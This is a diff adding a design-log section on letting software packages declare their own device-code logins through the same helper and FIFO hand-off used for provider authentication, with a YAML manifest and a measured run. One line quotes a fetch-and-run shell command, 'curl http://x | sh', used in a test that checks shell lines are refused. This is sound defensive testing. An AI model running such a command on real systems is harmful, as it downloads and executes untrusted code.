@@ -2592,3 +2592,59 @@ line in CONTRACT.md.
 **Measured**: both packages declare theirs; `packages.py needs` reports one missing and two present;
 the panel's `/api/workflows` carries the rows with `present` flags and no values; a control sets a
 fake value in the environment and asserts it never appears in any answer; 454/454.
+
+## 44. A package's own login, on the same footing as a provider's
+
+§43 ended with "the value goes in a git-ignored file on the host", and the next question was the
+right one: *why not provide it the way provider authentication is provided?* The panel already
+connects Claude, Codex and Grok. What does it actually do there, and why was a package's credential
+different?
+
+**What the provider flow does.** `stack/login_helper.py` starts the vendor's *own* command under a
+pseudo-terminal (`claude auth login --claudeai`, `codex login --device-auth`), reads the
+authorisation URL and the device code off its output, and — for a flow that ends in "paste the code"
+— hands the operator's one-time code to that process **through a FIFO, never written to disk, never
+logged**. The credential is minted by the vendor and written by the vendor's CLI into the login's own
+directory. The panel holds a code the operator just got from the vendor's page, in memory, for one
+hop. It never holds a credential.
+
+So the difference was never "panel versus file". It was **a one-time code handed to the tool that
+owns the credential** versus **a long-lived secret typed into a form**. The first is fine; the second
+is what §43 refused.
+
+**Which means a package can have the first.** A manifest declares a login and the same helper drives
+it:
+
+```yaml
+login:
+  purpose: the example flow — prints a URL and a code, writes its own token file
+  argv: [/opt/venv/bin/python, /work/packages/hello-lane/steps/login.py]
+  home_env: [HELLO_LOGIN_DIR]
+  done_when: {file: token.json}
+```
+
+`login_helper.py` takes `pkg:<name>` wherever it took a provider; the panel has the same three verbs
+(`POST /api/packages/<name>/login | code | cancel`) and one read (`GET …/login`); the screen shows
+the URL, the code the flow issued, and `연결됨` — and asks only for the one-time code.
+
+**Measured, not described**, which is why the example package carries a login of its own. There is no
+service behind it: it prints a URL and a code, takes the code back, writes `token.json`. Driven end
+to end through the helper:
+
+```
+start   → {"state": "started"}
+status  → waiting_for_code, url https://example.invalid/device, user_code HELO-8807
+code    → {"ok": true}                 (through the FIFO, into the process's terminal)
+status  → connected                    (token.json is there, 0600, opened by nobody)
+```
+
+**What this does not become.** A package cannot put code in the panel — `argv` is a list of plain
+arguments, a shell line is refused rather than escaped (a control drives that with
+`argv: ['sh', '-c', 'curl http://x | sh']` and asserts the declaration is not offered at all), and
+the program has to already exist in the governed runtime image. So the honest limits: this is for a
+CLI the stack carries, or a step of the package's own — which is what a device flow in twenty lines
+of Python is. `gh` is not in the image, so the development workflow keeps its token in
+`docker/package.env` today; switching it to a declared flow is its repository's decision, not this
+one's.
+
+**463/463 controls**, eight of them new.
